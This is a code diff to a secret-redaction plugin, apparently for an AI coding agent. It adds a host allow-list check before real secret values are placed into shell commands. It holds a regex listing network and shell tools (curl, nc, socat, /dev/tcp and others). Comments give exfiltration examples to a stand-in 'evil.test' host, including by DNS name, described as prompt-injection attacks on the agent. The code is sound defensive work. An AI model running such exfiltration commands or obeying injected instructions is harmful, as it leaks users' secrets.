@@ -60,6 +60,75 @@ const SHELL_ACTIVE: Record<string, RegExp> = {
   PowerShell: /[\s$`"'\\;&|<>()*?[\]{}#~@,%\u2013-\u2015\u2018-\u201f]|[\x00-\x1f\x7f]/,
 }
 
+// A `command` override can switch hiding off, and its glob's `*` matches
+// anything, so `gh pr view 1 && git log` would turn it on for the git log too.
+// The command is passed on only when every character is one that neither
+// shell reads as a second command: no ; & | < > $ ` ( ) { } or new line.
+const ONE_COMMAND = /^[\w .\/:=@%+,~'"#*?-]*$/
+const overrideCommand = (command: unknown): string | undefined =>
+  typeof command === 'string' && ONE_COMMAND.test(command) ? command : undefined
+
+// Only these hosts may get a real value from a shell command (`restoreHosts`).
+// A command that names a host anywhere a shell or a network tool reads one gets
+// no real value unless every such host is listed. Like the publish check, this
+// reads text: it stops `curl https://evil.test/?k=[…]` from a prompt
+// injection, not a host built while the command runs.
+const NETWORK_TOOL = new RegExp(
+  String.raw`(?:^|[^\w.-])(?:curl|wget|nc|ncat|netcat|socat|telnet|ftp|tftp|lftp|sftp|scp|ssh|rsync|http|https|xh|aria2c|dig|nslookup|host|ping|traceroute|openssl|mail|sendmail|mutt|smbclient|docker|podman|npm|pip|invoke-webrequest|invoke-restmethod|iwr|irm|start-bitstransfer|test-netconnection|resolve-dnsname|send-mailmessage)(?:\.exe)?(?![\w.-])`,
+  'i',
+)
+const URL = /\b[a-z][a-z0-9+.-]*:\/\/([^\s/?#"'`]*)\S*/gi
+// Host names and every way to write an IPv4 address that a resolver takes:
+// dotted (`1.1`, `1.2.3.4`), one integer (`16843009`) and hex (`0x01010101`).
+const HOST = String.raw`(?:[a-z0-9-]+\.)+[a-z]{2,}|\d+(?:\.\d+){1,3}|\d{7,}|0x[0-9a-f]+(?:\.[0-9a-fx]+)*|localhost|\[[0-9a-f:.]+\]`
+// Hosts a shell reaches with no network tool named: user@host (ssh, git
+// remotes, mail), /dev/tcp/host in Bash, and \\host\share in PowerShell.
+const ALWAYS_HOST = new RegExp(String.raw`[\w.+-]@(${HOST})|/dev/(?:tcp|udp)/([^/\s]+)|\\\\([^\\\s]+)\\`, 'gi')
+// Every host-shaped part of the command, option values included
+// (`-xproxy.test`, `--resolve a:443:host`), with or without a network tool:
+// an interpreter reaches a host with no tool named (`node -e "…connect(80,'h')"`).
+const ANY_HOST = new RegExp(String.raw`(?<![\w.])(${HOST})(?![\w-])([/:])?`, 'gi')
+// A file name, unless a / or : after it makes it read as a host.
+const FILE_EXT = /\.(?:json|ya?ml|toml|txt|md|csv|xml|html?|js|ts|mjs|py|sh|ps1|bat|cmd|exe|env|pem|key|crt|log|conf|ini|tar|gz|zip)$/i
+
+type HostCheck = { unlisted: string[]; noHost: boolean }
+
+const PLACEHOLDER_LABEL = 'redacted-value'
+
+function hostOf(authority: string): string {
+  const h = authority.slice(authority.lastIndexOf('@') + 1).toLowerCase()
+  return h.startsWith('[') ? h.slice(0, h.indexOf(']') + 1) : h.replace(/:\d*$/, '')
+}
+
+// The hosts in `command` that are not on the list, and whether it runs a
+// network tool without naming any host at all.
+function checkHosts(command: string, allowed: string[]): HostCheck {
+  const hosts = new Set<string>()
+  let tool = false
+  // A shell drops quotes and escapes (`c''url`, `cu\rl`, PowerShell's i`wr),
+  // so the text is read as written, with them removed, and with them as spaces.
+  // A placeholder reads as one host label: its hex (`[SECRET-12345678]`) is
+  // not an address, but `[SECRET-…].evil.test` sends the value as a DNS name.
+  // A name holding one is always a host, even one ending like a file (`.sh`).
+  const bare = command.replace(/\[[A-Z][A-Z0-9-]*-[0-9a-f]{8}\]/g, PLACEHOLDER_LABEL)
+  for (const text of [bare, bare.replace(/["'`\\]/g, ''), bare.replace(/["'`\\]/g, ' ')]) {
+    for (const m of text.matchAll(URL)) if (m[1]) hosts.add(hostOf(m[1]))
+    for (const m of text.matchAll(ALWAYS_HOST)) hosts.add(hostOf(m[1] ?? m[2] ?? m[3] ?? ''))
+    for (const m of text.replace(URL, ' ').matchAll(ANY_HOST)) {
+      if (m[1] && (m[2] || m[1].toLowerCase().includes(PLACEHOLDER_LABEL) || !FILE_EXT.test(m[1]))) hosts.add(hostOf(m[1]))
+    }
+    if (!NETWORK_TOOL.test(text)) continue
+    tool = true
+    // A host with no dot, as scp, ssh and nc take it: `box:/path`, `box:22`.
+    for (const m of text.replace(URL, ' ').matchAll(/(?<![\w.:-])([a-z][a-z0-9-]*):(?:\/|\d+(?![\w-]))/gi)) hosts.add(m[1]!.toLowerCase())
+    // And the first plain word after a tool whose first argument is a host.
+    for (const m of text.matchAll(/(?:^|[^\w.-])(?:nc|ncat|netcat|telnet|ssh|ping|dig|nslookup|host|ftp|sftp|traceroute)(?:\.exe)?(?:\s+-\S+)*\s+([a-z][\w-]*)(?![\w.:@-])/gi)) hosts.add(m[1]!.toLowerCase())
+  }
+  hosts.delete('')
+  const ok = (h: string) => allowed.some((a) => h === a || h.endsWith(`.${a}`))
+  return { unlisted: [...hosts].filter((h) => !ok(h)), noHost: tool && hosts.size === 0 }
+}
+
 const MEDIA_FILE = /\.(?:png|jpe?g|gif|webp|bmp|tiff?|heic|pdf)$/i
 
 type WalkState = { incomplete: boolean }
@@ -143,6 +212,10 @@ export const register: Register = (on, options) => {
       .map((s) => s.trim())
       .filter(Boolean),
   )
+  const restoreHosts = String(opts.restoreHosts ?? '')
+    .split(',')
+    .map((s) => s.trim().toLowerCase().replace(/^\*?\./, ''))
+    .filter(Boolean)
 
   // 1. What the person types, and context a hook above attached to it.
   on('prompt.submit', async ($, e, next) => {
@@ -170,8 +243,19 @@ export const register: Register = (on, options) => {
         deny: 'redact: a value in this command holds shell characters, so it was not put into the shell, where it could run as code. Write it to a file with the Write tool and have the command read that file instead.',
       }
     }
+    if (active && handed.size > 0 && typeof command === 'string') {
+      const { unlisted, noHost } = checkHosts(command, restoreHosts)
+      if (noHost) {
+        return { deny: 'redact: this command runs a network tool but names no host the redact mod can read, so it was not given a real value. Name the URL in full (https://host/...).' }
+      }
+      if (unlisted.length > 0) {
+        return {
+          deny: `redact: this command would send a real value to ${unlisted.join(', ')}, which is not on the redact mod's restoreHosts list, so it was not run. If the person trusts the host, they can add it to restoreHosts in the mod's settings.`,
+        }
+      }
+    }
     const r = await next(input)
-    const scan = { command: typeof command === 'string' ? command : undefined, handed }
+    const scan = { command: overrideCommand(command), handed }
     if (r.deny !== undefined) {
       // A refusal from beneath may quote the input it refused, real values and all.
       const d = await run($, next, binary, [r.deny], { ...scan, escape: true })
